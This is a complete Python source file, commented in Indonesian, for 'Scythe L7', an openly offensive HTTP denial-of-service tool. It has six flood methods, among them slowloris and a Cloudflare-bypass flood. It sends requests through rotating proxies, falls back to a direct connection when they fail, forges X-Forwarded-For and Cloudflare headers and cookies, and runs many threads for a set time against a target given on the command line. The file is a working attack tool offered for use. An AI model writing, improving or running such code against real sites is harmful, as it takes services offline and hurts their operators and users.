#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║  SCYTHE L7 ENGINE v15.0 — PROFESSIONAL (MHDDOS-STYLE)                       ║
║  🔥 6 METODE: httpbypass, cf-flood, slow, httpget, httpflood, auto         ║
║  🔥 Engine: requests + PyRoxy + cloudscraper                                ║
║  🔥 Proxy: support HTTP, HTTPS, SOCKS4, SOCKS5                             ║
║  🔥 Session per proxy: 50-100 request, lebih efisien                        ║
║  🔥 Fallback direct otomatis jika proxy mati                                ║
║  🔥 Fitur: Cloudflare bypass, header spoofing, random path                 ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
import sys
import os
import time
import random
import string
import threading
import socket
import ssl
import urllib.parse
import hashlib
import base64
import json

# --- Import library wajib ---
try:
    import requests
    import cloudscraper
    from PyRoxy import Proxy, ProxyType
except ImportError as e:
    print(f"[ERROR] Library missing: {e}")
    print("Install: pip3 install requests cloudscraper PyRoxy")
    sys.exit(1)

# --- Fungsi cari proxy file ---
def find_proxy_file(filename="proxies.txt"):
    paths = [
        filename,
        os.path.join(os.path.dirname(__file__), filename),
        os.path.join(os.path.dirname(os.path.dirname(__file__)), filename),
        "/root/ddosxscythe/" + filename,
    ]
    for p in paths:
        if os.path.exists(p):
            return os.path.abspath(p)
    return None

# --- ProxyManager (dengan PyRoxy) ---
class ProxyManager:
    def __init__(self, proxy_file):
        self.proxy_file = proxy_file
        self.proxies = []  # list of Proxy objects from PyRoxy
        self.lock = threading.Lock()
        self.last_reload = 0
        self.reload_interval = 15
        self._load()

    def _load(self):
        if not self.proxy_file or not os.path.exists(self.proxy_file):
            self.proxies = []
            return
        try:
            with open(self.proxy_file, "r") as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            new_proxies = []
            for line in lines:
                try:
                    # PyRoxy bisa parse berbagai format
                    p = Proxy(line)
                    new_proxies.append(p)
                except:
                    # fallback: coba http://ip:port
                    try:
                        p = Proxy(f"http://{line}")
                        new_proxies.append(p)
                    except:
                        pass
            with self.lock:
                self.proxies = new_proxies
                self.last_reload = time.time()
            if new_proxies:
                print(f"[PROXY] Loaded {len(new_proxies)} proxies", flush=True)
        except Exception as e:
            print(f"[PROXY ERROR] {e}", flush=True)

    def get(self):
        if time.time() - self.last_reload > self.reload_interval:
            self._load()
        with self.lock:
            if not self.proxies:
                return None
            return random.choice(self.proxies)

    def count(self):
        with self.lock:
            return len(self.proxies)

# --- L7 Engine ---
class L7AttackEngine:
    def __init__(self, target, duration, threads, proxy_file=None, method_type="httpbypass"):
        self.target = target
        self.duration = int(duration)
        self.threads = int(threads)
        self.method_type = method_type.lower()
        self.proxy_mgr = ProxyManager(proxy_file)
        self.running = False
        self.total_requests = 0
        self.total_bytes = 0
        self.counter_lock = threading.Lock()
        self.start_time = 0
        self.end_time = 0
        self.error_count = 0
        self.error_lock = threading.Lock()
        self.error_limit = 30
        self.error_time = 0
        self.requests_per_proxy = 50   # 🔥 efisiensi
        self._parse_target()

    def _parse_target(self):
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'https://' + self.target
        parsed = urllib.parse.urlparse(self.target)
        self.scheme = parsed.scheme or 'https'
        self.host = parsed.netloc or parsed.path
        self.port = parsed.port or (443 if self.scheme == 'https' else 80)
        if ':' in self.host:
            self.host = self.host.split(':')[0]

    def _headers(self, extra=None, use_cf=False):
        ua = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        ])
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.9', 'fr-FR,fr;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        if random.random() > 0.5:
            headers['Referer'] = f"https://{self.host}/"
        if use_cf:
            headers['CF-Connecting-IP'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['CF-IPCountry'] = random.choice(['US', 'ID', 'GB', 'DE', 'FR', 'JP', 'SG', 'NL'])
            headers['CF-Visitor'] = '{"scheme":"https"}'
            headers['CF-RAY'] = hashlib.md5(str(random.random()).encode()).hexdigest()[:16]
            headers['Cookie'] = f"__cf_bm={random._urandom(16).hex()}; cf_clearance={random._urandom(32).hex()}"
        if extra:
            headers.update(extra)
        return headers

    def _path(self):
        paths = ['/', '/index.html', '/api', '/home', '/login', '/register', '/wp-admin',
                 '/admin', '/assets/', '/favicon.ico', '/sitemap.xml', '/robots.txt',
                 '/api/v1/users', '/api/v1/orders', '/graphql', '/search', '/category']
        path = random.choice(paths)
        if random.random() > 0.3:
            path += f"?cb={random.randint(100000,999999)}&t={int(time.time())}"
        return path

    def _log_error(self, msg):
        with self.error_lock:
            now = time.time()
            if now - self.error_time > 1:
                self.error_time = now
                self.error_count = 0
            if self.error_count < self.error_limit:
                self.error_count += 1
                print(f"[ERROR] {msg}", flush=True)

    # --- Core send request menggunakan requests + PyRoxy ---
    def _send_request(self, proxy_obj=None, method='GET', path=None, body=None, extra_headers=None, retries=2, use_direct_fallback=True):
        url = f"{self.scheme}://{self.host}{path or self._path()}"
        headers = self._headers(extra_headers)
        proxies = None
        if proxy_obj:
            # Konversi proxy ke format requests
            try:
                proxies = {
                    'http': proxy_obj.to_url(),
                    'https': proxy_obj.to_url()
                }
            except:
                # jika gagal, coba string
                proxies = {
                    'http': f"http://{proxy_obj}",
                    'https': f"http://{proxy_obj}"
                }
        for attempt in range(retries):
            try:
                # Gunakan cloudscraper jika target CF dan tidak ada proxy
                if 'cloudflare' in self.target.lower() or 'cf' in self.target.lower():
                    session = cloudscraper.create_scraper()
                else:
                    session = requests.Session()
                if proxies:
                    session.proxies = proxies
                session.verify = False
                session.timeout = 15
                resp = session.request(
                    method=method,
                    url=url,
                    headers=headers,
                    allow_redirects=True,
                    timeout=15
                )
                # Sukses walaupun status 4xx/5xx (kita hanya butuh traffic)
                return True, len(resp.content)
            except Exception as e:
                if attempt < retries - 1:
                    continue
                # Jika proxy gagal dan fallback direct diizinkan
                if use_direct_fallback and proxy_obj is not None:
                    return self._send_request(proxy_obj=None, method=method, path=path, body=body,
                                              extra_headers=extra_headers, retries=1, use_direct_fallback=False)
                self._log_error(f"request fail: {e}")
                return False, 0
        return False, 0

    # --- Special slow request (pakai socket manual) ---
    def _send_slow_request(self, proxy_obj=None):
        # Slowloris: buka koneksi dan kirim header parsial
        sock = None
        try:
            if proxy_obj:
                # Dapatkan host dan port dari proxy
                proxy_str = str(proxy_obj)
                if '://' in proxy_str:
                    proxy_str = proxy_str.split('://')[-1]
                # parse host:port
                if '@' in proxy_str:
                    proxy_str = proxy_str.split('@')[-1]
                p_host, p_port = proxy_str.split(':')
                p_port = int(p_port)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((p_host, p_port))
                if self.scheme == 'https':
                    # CONNECT untuk HTTPS
                    connect = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
                    sock.sendall(connect.encode())
                    resp = sock.recv(1024)
                    if b'200' not in resp:
                        sock.close()
                        return False
                    # Wrap SSL
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.host, self.port))
                if self.scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
            # Kirim request awal (belum selesai)
            sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
            # Simpan koneksi untuk dikirim header berkala
            return True, sock
        except Exception as e:
            if sock:
                try: sock.close()
                except: pass
            self._log_error(f"slow connect: {e}")
            return False, None

    # --- WORKERS (6 metode) ---

    def _httpbypass_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            proxy = self.proxy_mgr.get()
            for _ in range(self.requests_per_proxy):
                if not self.running or time.time() >= end_time:
                    break
                extra = {
                    'Sec-Fetch-Dest': random.choice(['document', 'empty', 'script']),
                    'Sec-Fetch-Mode': random.choice(['navigate', 'no-cors', 'cors']),
                    'Sec-Fetch-Site': random.choice(['same-origin', 'cross-site', 'none']),
                }
                if random.random() > 0.5:
                    extra['Sec-Ch-Ua'] = '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"'
                    extra['Sec-Ch-Ua-Mobile'] = '?0'
                    extra['Sec-Ch-Ua-Platform'] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
                success, bytes_recv = self._send_request(proxy, extra_headers=extra, retries=1)
                if success:
                    local_count += 1
                    local_bytes += bytes_recv
                else:
                    break  # proxy mati, pindah
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _cfflood_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            proxy = self.proxy_mgr.get()
            for _ in range(self.requests_per_proxy):
                if not self.running or time.time() >= end_time:
                    break
                extra = {
                    'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    'CF-IPCountry': random.choice(['US', 'ID', 'GB', 'DE', 'FR', 'JP', 'SG', 'NL']),
                    'CF-Visitor': '{"scheme":"https"}',
                    'CF-RAY': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                    'CF-Request-ID': hashlib.md5(str(random.random()).encode()).hexdigest()[:32],
                    'Cookie': f"__cf_bm={random._urandom(16).hex()}; cf_clearance={random._urandom(32).hex()}",
                }
                success, bytes_recv = self._send_request(proxy, extra_headers=extra, retries=1)
                if success:
                    local_count += 1
                    local_bytes += bytes_recv
                else:
                    break
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _slow_worker(self):
        end_time = self.end_time
        local_count = 0
        connections = []
        while self.running and time.time() < end_time:
            try:
                # Buka koneksi baru jika < 100
                while len(connections) < 100 and self.running and time.time() < end_time:
                    proxy = self.proxy_mgr.get()
                    success, sock = self._send_slow_request(proxy)
                    if success and sock:
                        connections.append({'sock': sock, 'last': time.time()})
                        local_count += 1
                    else:
                        # jika gagal, coba proxy lain
                        continue
                # Kirim header parsial untuk koneksi yang sudah ada
                for conn in connections[:]:
                    if time.time() - conn['last'] > random.randint(8, 15):
                        try:
                            header = ''.join(random.choices(string.ascii_letters, k=random.randint(5,15)))
                            value = random._urandom(random.randint(10,100)).hex()
                            conn['sock'].sendall(f"{header}: {value}\r\n".encode())
                            conn['last'] = time.time()
                        except:
                            try: conn['sock'].close()
                            except: pass
                            connections.remove(conn)
                time.sleep(0.5)
            except Exception as e:
                self._log_error(f"slow outer: {e}")
        for conn in connections:
            try: conn['sock'].close()
            except: pass
        with self.counter_lock:
            self.total_requests += local_count

    def _httpget_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            proxy = self.proxy_mgr.get()
            for _ in range(self.requests_per_proxy):
                if not self.running or time.time() >= end_time:
                    break
                path = self._path()
                success, bytes_recv = self._send_request(proxy, path=path, retries=1)
                if success:
                    local_count += 1
                    local_bytes += bytes_recv
                else:
                    break
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _httpflood_worker(self):
        end_time = self.end_time
        local_count = 0
        local_bytes = 0
        while self.running and time.time() < end_time:
            proxy = self.proxy_mgr.get()
            # Satu proxy untuk satu session
            session = requests.Session()
            if proxy:
                try:
                    proxy_url = proxy.to_url()
                    session.proxies = {'http': proxy_url, 'https': proxy_url}
                except:
                    pass
            session.verify = False
            session.timeout = 15
            for _ in range(self.requests_per_proxy):
                if not self.running or time.time() >= end_time:
                    break
                try:
                    headers = self._headers()
                    path = self._path()
                    url = f"{self.scheme}://{self.host}{path}"
                    resp = session.get(url, headers=headers, allow_redirects=True, timeout=15)
                    local_count += 1
                    local_bytes += len(resp.content)
                except:
                    break
            session.close()
        with self.counter_lock:
            self.total_requests += local_count
            self.total_bytes += local_bytes

    def _auto_worker(self):
        end_time = self.end_time
        local_count = 0
        workers = [self._httpbypass_worker, self._cfflood_worker,
                   self._httpget_worker, self._httpflood_worker]
        worker_idx = 0
        last_switch = time.time()
        switch_interval = 30
        while self.running and time.time() < end_time:
            try:
                if time.time() - last_switch > switch_interval:
                    worker_idx = (worker_idx + 1) % len(workers)
                    last_switch = time.time()
                workers[worker_idx]()
            except Exception as e:
                self._log_error(f"auto: {e}")
        with self.counter_lock:
            self.total_requests += local_count

    # --- RPS Reporter ---
    def _rps_reporter(self):
        last_total = 0
        last_time = time.time()
        while self.running:
            time.sleep(1)
            with self.counter_lock:
                current_total = self.total_requests
            elapsed = time.time() - last_time
            rps = int((current_total - last_total) / elapsed) if elapsed > 0 else 0
            print(f"RPS: {rps} | Total: {current_total} | Proxy: {self.proxy_mgr.count()}", flush=True)
            sys.stdout.flush()
            last_total = current_total
            last_time = time.time()

    # --- START ---
    def start(self):
        self.running = True
        self.start_time = time.time()
        self.end_time = self.start_time + self.duration
        proxy_count = self.proxy_mgr.count()

        print(f"\n[Scythe L7 v15.0] {self.method_type.upper()} attack launched", flush=True)
        print(f"🎯 Target: {self.target}", flush=True)
        print(f"⏱️  Duration: {self.duration}s | Threads: {self.threads} | Proxies: {proxy_count}", flush=True)
        print(f"🔁 Requests per proxy: {self.requests_per_proxy}", flush=True)
        if proxy_count == 0:
            print(f"⚠️  No proxies — using DIRECT connection (your VPS IP)", flush=True)
        print(f"{'='*60}\n", flush=True)
        sys.stdout.flush()

        reporter = threading.Thread(target=self._rps_reporter, daemon=True)
        reporter.start()

        worker_map = {
            'httpbypass': self._httpbypass_worker,
            'cf-flood': self._cfflood_worker,
            'slow': self._slow_worker,
            'httpget': self._httpget_worker,
            'httpflood': self._httpflood_worker,
            'auto': self._auto_worker,
        }
        worker_func = worker_map.get(self.method_type, self._httpbypass_worker)

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=worker_func, daemon=True)
            t.start()
            threads.append(t)

        time.sleep(2)
        alive = sum(1 for t in threads if t.is_alive())
        if alive == 0:
            print(f"[WARN] All threads died! Forcing direct mode...", flush=True)
            with self.proxy_mgr.lock:
                self.proxy_mgr.proxies = []
            for _ in range(self.threads):
                t = threading.Thread(target=worker_func, daemon=True)
                t.start()
                threads.append(t)

        time.sleep(max(0, self.duration - 2))
        self.running = False

        for t in threads:
            t.join(timeout=2)

        with self.counter_lock:
            final_total = self.total_requests
            final_bytes = self.total_bytes

        elapsed = time.time() - self.start_time
        avg_rps = int(final_total / elapsed) if elapsed > 0 else 0

        print(f"\n[Scythe L7] Attack completed!", flush=True)
        print(f"📊 Total Requests: {final_total:,} | Avg RPS: {avg_rps:,} | Bytes: {final_bytes:,}", flush=True)
        print(f"⚠️  Total Errors: {self.error_count}", flush=True)
        print(f"{'='*60}\n", flush=True)
        sys.stdout.flush()

        return final_total, avg_rps, final_bytes

if __name__ == '__main__':
    if len(sys.argv) < 4:
        print("\n" + "="*60)
        print("🔥 SCYTHE L7 ENGINE v15.0 — PROFESSIONAL")
        print("="*60)
        print("\nUsage:")
        print("  python3 l7_engine.py <method> <target> <duration> [threads] [proxy_file]")
        print("\n6 Methods:")
        for m in ['httpbypass', 'cf-flood', 'slow', 'httpget', 'httpflood', 'auto']:
            print(f"  - {m}")
        print("\nExamples:")
        print("  python3 l7_engine.py httpbypass example.com 60 500")
        print("  python3 l7_engine.py cf-flood example.com 120 1000")
        print("="*60)
        sys.exit(1)

    args = [a for a in sys.argv[1:] if a != '--debug']
    method = args[0].lower()
    target = args[1]
    duration = args[2]
    threads = args[3] if len(args) > 3 else '100'
    proxy_file = args[4] if len(args) > 4 else find_proxy_file()

    engine = L7AttackEngine(target, duration, threads, proxy_file, method)
    engine.start()